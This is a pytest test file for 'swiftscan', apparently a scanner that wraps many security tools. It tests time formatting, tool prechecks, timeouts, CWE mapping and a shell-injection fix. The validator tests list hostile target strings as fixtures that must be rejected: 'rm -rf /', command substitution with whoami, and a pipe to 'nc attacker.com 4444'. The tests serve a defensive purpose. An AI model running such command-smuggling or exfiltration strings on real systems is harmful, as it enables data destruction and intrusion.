import subprocess
import sys
import pytest
import swiftscan


# ---------------------------------------------------------------------------
# Importing the module must not parse sys.argv, print the banner, or exit.
# (Regression test for wrapping the CLI flow in `if __name__ == "__main__":`.)
# ---------------------------------------------------------------------------
def test_import_has_no_side_effects():
    assert hasattr(swiftscan, "url_maker")
    assert hasattr(swiftscan, "validate_target")
    # tool_names/tool_cmd/tool_resp/tool_status are built at import time from
    # a random.shuffle() of static tables - they should exist and line up.
    assert len(swiftscan.tool_names) == len(swiftscan.tool_cmd) == \
        len(swiftscan.tool_resp) == len(swiftscan.tool_status)


def test_module_runs_clean_via_subprocess_with_help_flag():
    # A real end-to-end check that `python3 swiftscan.py --help` behaves and
    # doesn't crash with a traceback.
    result = subprocess.run(
        [sys.executable, swiftscan.__file__, "--help"],
        capture_output=True, text=True, timeout=10,
    )
    assert result.returncode == 0
    assert "Information:" in result.stdout


# ---------------------------------------------------------------------------
# display_time
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("seconds,expected", [
    (0, "1s"),
    (59, "1m"),
    (61, "1m 2s"),
    (3661, "1h 1m 2s"),
    (7200, "2h 1s"),  # display_time() pads +1s before formatting (pre-existing behavior)
])
def test_display_time(seconds, expected):
    assert swiftscan.display_time(seconds) == expected


# ---------------------------------------------------------------------------
# validate_target / url_maker - the shell-injection fix
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("host", [
    "example.com",
    "sub.example.co.uk",
    "8.8.8.8",
    "a",
    "example-with-hyphens.com",
])
def test_validate_target_accepts_plausible_hosts(host):
    assert swiftscan.validate_target(host) == host


@pytest.mark.parametrize("bad_input", [
    "",
    "example.com; rm -rf /",
    "example.com && whoami",
    "example.com | nc attacker.com 4444",
    "$(whoami).example.com",
    "`whoami`.example.com",
    "example.com\nrm -rf /",
    "example.com'",
    'example.com"',
    "example.com ",  # embedded space
])
def test_validate_target_rejects_shell_metacharacters(bad_input):
    with pytest.raises(ValueError):
        swiftscan.validate_target(bad_input)


@pytest.mark.parametrize("raw,expected_host", [
    ("example.com", "example.com"),
    ("http://example.com", "example.com"),
    ("https://example.com/some/path", "example.com"),
    ("https://www.example.com", "example.com"),
    ("example.com:8080", "example.com"),
])
def test_url_maker_normalizes_to_bare_host(raw, expected_host):
    assert swiftscan.url_maker(raw) == expected_host


def test_url_maker_rejects_injection_payload():
    with pytest.raises(ValueError):
        swiftscan.url_maker("example.com; rm -rf /")


def test_scan_command_string_cannot_break_out_of_shell():
    """
    End-to-end sanity check for the fix: build a command the same way the
    main scan loop does (prefix + shlex.quote(target) + suffix) and confirm
    a would-be injection payload is neutralized before it ever reaches the
    validation step, and that validation itself blocks it.
    """
    with pytest.raises(ValueError):
        target = swiftscan.url_maker("example.com; touch /tmp/pwned")
        swiftscan.validate_target(target)


# ---------------------------------------------------------------------------
# vul_info / bcolors
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("severity", ["c", "h", "m", "l", "i", "anything-else"])
def test_vul_info_always_returns_a_labeled_string(severity):
    result = swiftscan.vul_info(severity)
    assert isinstance(result, str)
    assert len(result) > 0


# ---------------------------------------------------------------------------
# terminal_size - must never raise, even with no controlling terminal
# ---------------------------------------------------------------------------
def test_terminal_size_never_raises():
    assert isinstance(swiftscan.terminal_size(), int)


# ---------------------------------------------------------------------------
# check_internet - mocked, since tests shouldn't depend on live network
# ---------------------------------------------------------------------------
def test_check_internet_true_on_success(monkeypatch):
    class FakeCompletedProcess:
        stdout = b"1 packets transmitted, 1 received, 0% packet loss, time 0ms"

    monkeypatch.setattr(subprocess, "run", lambda *a, **k: FakeCompletedProcess())
    assert swiftscan.check_internet() is True


def test_check_internet_false_on_timeout(monkeypatch):
    def raise_timeout(*a, **k):
        raise subprocess.TimeoutExpired(cmd="ping", timeout=10)

    monkeypatch.setattr(subprocess, "run", raise_timeout)
    assert swiftscan.check_internet() is False


# ---------------------------------------------------------------------------
# Tool precheck - now shutil.which()-based instead of spawning every tool
# ---------------------------------------------------------------------------
def test_precheck_uses_which_not_subprocess(monkeypatch):
    """Regression test: precheck must not spawn a process per tool anymore -
    it should ask shutil.which() and never touch subprocess.Popen at all."""
    def fail_if_called(*a, **k):
        raise AssertionError("run_scan() precheck should not call subprocess.Popen")

    monkeypatch.setattr(subprocess, "Popen", fail_if_called)
    monkeypatch.setattr(swiftscan.shutil, "which", lambda name: "/usr/bin/" + name)
    # Drain just the precheck events; stop before the (unmocked) real scan loop
    # would try to actually run tools.
    events = []
    for event in swiftscan.run_scan("example.com", skip={"amass"}):
        events.append(event)
        if event["event"] == "precheck_done":
            break
    precheck_events = [e for e in events if e["event"] == "tool_precheck"]
    assert precheck_events, "expected at least one tool_precheck event"
    amass_event = next(e for e in precheck_events if e["tool"] == "amass")
    assert amass_event["available"] is False  # explicitly skipped via `skip`


def test_precheck_deduplicates_binaries(monkeypatch):
    """tools_precheck has duplicate binaries (e.g. 'golismero', 'davtest');
    each should only be checked once per run_scan() call."""
    calls = []
    monkeypatch.setattr(swiftscan.shutil, "which", lambda name: calls.append(name) or "/usr/bin/" + name)
    for event in swiftscan.run_scan("example.com"):
        if event["event"] == "precheck_done":
            break
    assert len(calls) == len(set(calls)), "shutil.which() was called more than once for the same binary"


# ---------------------------------------------------------------------------
# tool_names/tool_cmd/tool_resp/tool_status integrity assertion
# ---------------------------------------------------------------------------
def test_length_mismatch_raises_assertion_error():
    """Regression test for the old '/3 average, then round' cross-check,
    which couldn't reliably catch a real length mismatch. A fresh import
    of the module with mismatched tables must fail loudly."""
    import types

    src = open(swiftscan.__file__, encoding="utf-8").read()
    # Corrupt just the tool_status table so its length differs from the others.
    broken_src = src.replace(
        '["has IPv6",1,proc_low," < 15s","ipv6",["not found","has IPv6"]],',
        '',  # drop one entry -> length mismatch
        1,
    )
    assert broken_src != src, "test setup failed: nothing was removed"
    module = types.ModuleType("swiftscan_broken")
    module.__file__ = swiftscan.__file__
    with pytest.raises(AssertionError, match="must all be the same length"):
        exec(compile(broken_src, swiftscan.__file__, "exec"), module.__dict__)


# ---------------------------------------------------------------------------
# CWE reference mapping
# ---------------------------------------------------------------------------
def test_cwe_references_cover_every_tools_fix_id():
    fix_ids = {row[0] for row in swiftscan.tools_fix}
    assert fix_ids == set(swiftscan.CWE_REFERENCES.keys())


def test_tool_result_event_includes_cwe_field(monkeypatch):
    """A vulnerable tool_result event should carry the matching 'cwe' value
    from CWE_REFERENCES for its fix id. Uses a single fake tool ('python')
    so the test doesn't depend on POSIX utilities or actual scanning tools."""
    fake_cmd_str = f'"{sys.executable}" -c "print(\'Vulnerable!\')" '
    fake_names = (["fake_check", "Fake Check", "python", 1],)
    fake_cmd = ([fake_cmd_str, ""],)
    fake_resp = (["Vulnerable!", "m", 12],)  # fix id 12 -> CWE-693 (see CWE_REFERENCES)
    fake_status = (["VULNERABLE", 1, swiftscan.proc_low, " < 1s", "fakecheck", ["marker-that-wont-appear"]],)
    monkeypatch.setattr(swiftscan.shutil, "which", lambda name: sys.executable)
    monkeypatch.setattr(swiftscan, "tool_names", fake_names)
    monkeypatch.setattr(swiftscan, "tool_cmd", fake_cmd)
    monkeypatch.setattr(swiftscan, "tool_resp", fake_resp)
    monkeypatch.setattr(swiftscan, "tool_status", fake_status)
    monkeypatch.setattr(swiftscan, "tools_precheck", [("python",)])

    events = list(swiftscan.run_scan("example.com", tool_timeout=5))
    result_events = [e for e in events if e["event"] == "tool_result"]

    assert len(result_events) == 1
    event = result_events[0]
    assert event["vulnerable"] is True
    assert event["cwe"] == swiftscan.CWE_REFERENCES[12] == "CWE-693"


# ---------------------------------------------------------------------------
# Per-tool timeout
# ---------------------------------------------------------------------------
def test_tool_timeout_yields_tool_timeout_event(monkeypatch):
    """A check that runs past `tool_timeout` should be killed and reported
    as a 'tool_timeout' event, not hang the scan or crash it."""
    fake_cmd_str = f'"{sys.executable}" -c "import time; time.sleep(5)" '
    fake_names = (["slow_check", "Slow Check", "python", 1],)
    fake_cmd = ([fake_cmd_str, ""],)  # will always exceed the 1s timeout below
    fake_resp = (["Vulnerable!", "m", 1],)
    fake_status = (["VULNERABLE", 1, swiftscan.proc_low, " < 1s", "slowcheck", []],)
    monkeypatch.setattr(swiftscan.shutil, "which", lambda name: sys.executable)
    monkeypatch.setattr(swiftscan, "tool_names", fake_names)
    monkeypatch.setattr(swiftscan, "tool_cmd", fake_cmd)
    monkeypatch.setattr(swiftscan, "tool_resp", fake_resp)
    monkeypatch.setattr(swiftscan, "tool_status", fake_status)
    monkeypatch.setattr(swiftscan, "tools_precheck", [("python",)])

    events = list(swiftscan.run_scan("example.com", tool_timeout=1))
    timeout_events = [e for e in events if e["event"] == "tool_timeout"]
    result_events = [e for e in events if e["event"] == "tool_result"]

    assert len(timeout_events) == 1
    assert timeout_events[0]["timeout"] == 1
    assert result_events == []  # a timed-out check must not also report a result

# ---------------------------------------------------------------------------
# main()'s CLI event loop, with run_scan() mocked out
# ---------------------------------------------------------------------------
def test_main_scan_flow_does_not_raise_unboundlocalerror(monkeypatch, tmp_path):
    """Regression test.

    main()'s per-scan counters (vulnerability list, elapsed time, skipped-
    check count) used to be module-level globals that main() reassigned
    (e.g. `rs_skipped_checks = rs_skipped_checks + 1`) without a `global`
    statement. That makes Python treat the name as local to the *entire*
    function, so the first tool_skipped/tool_result/tool_interrupted/
    tool_timeout event raised UnboundLocalError - i.e. every real scan
    crashed immediately. They're now ordinary locals inside main(). This
    drives the full CLI event-handling loop (every branch that touched the
    old globals) with run_scan() mocked out, so it needs no real scan tools,
    subprocesses, or network access.
    """
    monkeypatch.chdir(tmp_path)

    name0 = swiftscan.tool_names[0][1]
    name1 = swiftscan.tool_names[1][1]
    fake_events = [
        {"event": "tool_precheck", "tool": "nmap", "available": True},
        {"event": "precheck_done", "unavailable_tools": []},
        {"event": "tool_skipped", "name": name0, "index": 0, "total": 2},
        {"event": "tool_start", "name": name1, "index": 1, "total": 2},
        {"event": "tool_result", "name": name1, "index": 1, "elapsed": 0.1,
         "vulnerable": True, "severity": "l", "title": "t", "definition": "d",
         "remediation": "r", "cwe": "CWE-000"},
        {"event": "tool_interrupted", "name": name1, "index": 1, "elapsed": 0.1},
        {"event": "tool_timeout", "name": name1, "index": 1, "elapsed": 0.1, "timeout": 1},
        {"event": "api_finding", "source": "Shodan", "ok": False, "skipped": True,
         "reason": "SHODAN_API_KEY not set", "data": None},
        {"event": "scan_complete", "total_elapsed": 1.2, "checks_run": 1, "checks_skipped": 3,
         "vulnerabilities_found": 1,
         "findings": [{"name": name1, "severity": "l", "title": "t", "definition": "d",
                       "remediation": "r", "cwe": "CWE-000"}],
         "api_findings": [{"source": "Shodan", "ok": False, "skipped": True,
                            "reason": "SHODAN_API_KEY not set", "data": None}]},
    ]

    def fake_run_scan(target, skip=None, tool_timeout=None, **kwargs):
        yield from fake_events

    monkeypatch.setattr(swiftscan, "run_scan", fake_run_scan)

    # Should complete without raising (in particular, no UnboundLocalError).
    swiftscan.main(["example.com", "--nospinner", "--json"])

    assert (tmp_path / "reports").is_dir()
    json_reports = list((tmp_path / "reports").glob("rs.json.*.json"))
    assert len(json_reports) == 1
